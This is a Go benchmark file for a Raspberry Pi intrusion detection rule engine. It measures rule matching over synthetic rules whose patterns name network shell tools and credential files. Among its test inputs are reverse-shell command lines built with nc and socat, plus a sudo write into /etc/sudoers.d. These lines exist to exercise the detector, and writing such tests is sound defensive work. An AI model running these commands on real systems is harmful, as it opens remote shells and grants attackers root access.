package rules

import (
	"fmt"
	"testing"

	"github.com/pisentry/pisentry/internal/event"
)

// BenchmarkRuleMatch measures Engine.Eval for one event against 75, 500 and
// 1,000 rules of the event's source. The rules are generated here, not read
// from default.json or rule packs, so the numbers only move when the matcher
// does. One op is one event.

var benchTools = []string{
	"nc", "ncat", "socat", "curl", "wget", "python3", "perl", "ruby", "php", "lua",
	"busybox", "base64", "openssl", "xxd", "chmod", "chown", "setcap", "useradd", "usermod", "passwd",
	"crontab", "systemctl", "tar", "dd", "find", "awk", "gdb", "strace", "tcpdump", "nmap",
	"ssh", "scp", "rsync", "docker", "kubectl", "crictl", "mount", "insmod", "iptables", "tee",
}

// benchRule returns rule i for src. Each tool gets five rule shapes in a row,
// which mixes literal and regex conditions roughly like the shipped rules
// (about 40% of conditions are regex), with case-insensitive literals and
// exceptions. v keeps patterns distinct once the tool list wraps.
func benchRule(src Source, i int) Rule {
	tool := benchTools[(i/5)%len(benchTools)]
	v := i / (5 * len(benchTools))
	cmd := "process.cmdline"
	r := Rule{
		ID:       fmt.Sprintf("BENCH-%s-%04d", src, i),
		Title:    fmt.Sprintf("Synthetic %s rule %d (%s)", src, i, tool),
		Category: event.PrivEsc,
		Level:    event.High,
		MITRE:    []string{"T1059.004"},
		Source:   src,
	}
	// The second condition reads a field the source fills besides the cmdline.
	other := FieldCondition{Field: "process.comm", Equals: []string{tool}}
	if src == SourceLog {
		other = FieldCondition{Field: "log.msg", Contains: []string{"COMMAND=/usr/bin/" + tool}}
	}
	switch i % 5 {
	case 0: // literal only
		r.Match.All = []FieldCondition{
			other,
			{Field: cmd, Contains: []string{tool + " -e /bin/sh", fmt.Sprintf("/tmp/.%s-%d", tool, v)}},
		}
	case 1: // case-insensitive literals in an any branch
		r.Match.Any = []FieldCondition{
			{Field: cmd, StartsWith: []string{fmt.Sprintf("/dev/shm/%s%d", tool, v)}, EndsWith: []string{fmt.Sprintf(" --bench-%s-%d", tool, v)}, CaseInsensitive: true},
			{Field: cmd, Contains: []string{fmt.Sprintf("%s --payload=%d", tool, v)}, CaseInsensitive: true},
		}
	case 2: // regex only
		r.Match.All = []FieldCondition{
			{Field: cmd, Regex: []string{fmt.Sprintf(`(^|/)%s\s.*(--exec|-e)\s+\S*/(ba|da|z)?sh\b.*#%d`, tool, v)}},
		}
	case 3: // literal gate plus a regex
		r.Match.All = []FieldCondition{
			{Field: cmd, Contains: []string{tool}},
			{Field: cmd, Regex: []string{fmt.Sprintf(`\b%s\b.*\b(10|172|192)\.\d{1,3}\.\d{1,3}\.\d{1,3}:%d\b`, tool, 40000+v)}},
		}
	case 4: // regex with an exception
		r.Match.Any = []FieldCondition{
			{Field: cmd, Regex: []string{fmt.Sprintf(`(?i)%s\s+.*(/etc/(shadow|sudoers)|\.ssh/authorized_keys)\S*\s+#%d$`, tool, v)}},
		}
		if src == SourceLog {
			r.Exceptions = []Exception{{Users: []string{"ansible"}}}
		} else {
			r.Exceptions = []Exception{{ExePrefix: []string{"/usr/lib/"}}}
		}
	}
	return r
}

// benchEngine compiles n generated rules for src into an engine.
func benchEngine(b *testing.B, src Source, n int) *Engine {
	b.Helper()
	e := &Engine{byID: map[string]*CompiledRule{}, bySrc: map[Source][]*CompiledRule{}}
	for i := range n {
		cr, err := CompileRule("bench.json", i, benchRule(src, i))
		if err != nil {
			b.Fatal(err)
		}
		e.rules = append(e.rules, cr)
		e.bySrc[src] = append(e.bySrc[src], cr)
		e.byID[cr.Rule.ID] = cr
	}
	return e
}

// What a k3s node on a Pi runs, plus two hostile command lines that hit
// generated rules. Hits are rare in real traffic and so are they here.
var benchProcInputs = []EvalInput{
	{Process: event.ProcessEntity{PID: 812, PPID: 1, Comm: "k3s-server", Exe: "/usr/local/bin/k3s", Cmdline: "/usr/local/bin/k3s server --write-kubeconfig-mode 644 --disable traefik"}},
	{Process: event.ProcessEntity{PID: 1290, PPID: 1, Comm: "containerd-shim", Exe: "/var/lib/rancher/k3s/data/current/bin/containerd-shim-runc-v2", Cmdline: "/var/lib/rancher/k3s/data/current/bin/containerd-shim-runc-v2 -namespace k8s.io -id 3f9a1c7be2d04c55a8e1b6f0d9c2e47a1b3c5d7e9f0a2b4c6d8e0f1a3b5c7d9e -address /run/k3s/containerd/containerd.sock"}},
	{Process: event.ProcessEntity{PID: 640, PPID: 1, Comm: "sshd", Exe: "/usr/sbin/sshd", Cmdline: "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"}},
	{Process: event.ProcessEntity{PID: 4242, PPID: 4100, Comm: "python3", Exe: "/usr/bin/python3.13", Cmdline: "/usr/bin/python3 /opt/app/server.py --port 8080 --workers 4"}},
	{Process: event.ProcessEntity{PID: 2210, PPID: 1290, Comm: "prometheus", Exe: "/bin/prometheus", Cmdline: "/bin/prometheus --config.file=/etc/prometheus/prometheus.yml --storage.tsdb.retention.time=15d"}},
	{Process: event.ProcessEntity{PID: 5120, PPID: 5001, Comm: "bash", Exe: "/usr/bin/bash", Cmdline: "-bash"}},
	{Process: event.ProcessEntity{PID: 5133, PPID: 5120, Comm: "nc", Exe: "/usr/bin/nc.openbsd", Cmdline: "nc -e /bin/sh 192.0.2.10 4444"}},
	{Process: event.ProcessEntity{PID: 5150, PPID: 5120, Comm: "socat", Exe: "/usr/bin/socat", Cmdline: "socat tcp:10.0.0.5:40000 exec:/bin/bash"}},
}

var benchSudoInputs = []EvalInput{
	benchSudo("pi", "/usr/bin/apt-get upgrade -y"),
	benchSudo("pi", "/usr/bin/systemctl restart k3s"),
	benchSudo("pi", "/usr/bin/journalctl -u pisentry -f --since today"),
	benchSudo("pi", "/usr/bin/nano /etc/ssh/sshd_config"),
	benchSudo("ansible", "/bin/sh -c echo BECOME-SUCCESS-qwhzrpbkcmvtlxyd ; /usr/bin/python3 /home/ansible/.ansible/tmp/AnsiballZ_apt.py"),
	benchSudo("pi", "/usr/bin/kubectl -n monitoring get pods -o wide"),
	benchSudo("pi", "/usr/bin/tee /etc/sudoers.d/90-pi #0"),
	benchSudo("pi", "/usr/bin/curl -e /bin/sh -fsSL https://get.example.net/install.sh"),
}

func benchSudo(user, cmd string) EvalInput {
	return EvalInput{
		LogIdent: "sudo",
		LogMsg:   user + " : TTY=pts/0 ; PWD=/home/" + user + " ; USER=root ; COMMAND=" + cmd,
		User:     event.UserEntity{Name: user},
		Process:  event.ProcessEntity{Cmdline: cmd},
	}
}

func BenchmarkRuleMatch(b *testing.B) {
	for _, tc := range []struct {
		name   string
		src    Source
		inputs []EvalInput
	}{
		{"process", SourceProcess, benchProcInputs},
		{"sudo", SourceLog, benchSudoInputs},
	} {
		for i := range tc.inputs {
			tc.inputs[i].Source = tc.src
		}
		for _, n := range []int{75, 500, 1000} {
			b.Run(fmt.Sprintf("%s/rules=%d", tc.name, n), func(b *testing.B) {
				e := benchEngine(b, tc.src, n)
				hits := 0
				for _, in := range tc.inputs {
					hits += len(e.Eval(&in))
				}
				if hits == 0 {
					b.Fatal("no input matched a generated rule; the benchmark would skip the hit path")
				}
				b.ReportAllocs()
				i := 0
				for b.Loop() {
					e.Eval(&tc.inputs[i])
					i++
					if i == len(tc.inputs) {
						i = 0
					}
				}
			})
		}
	}
}
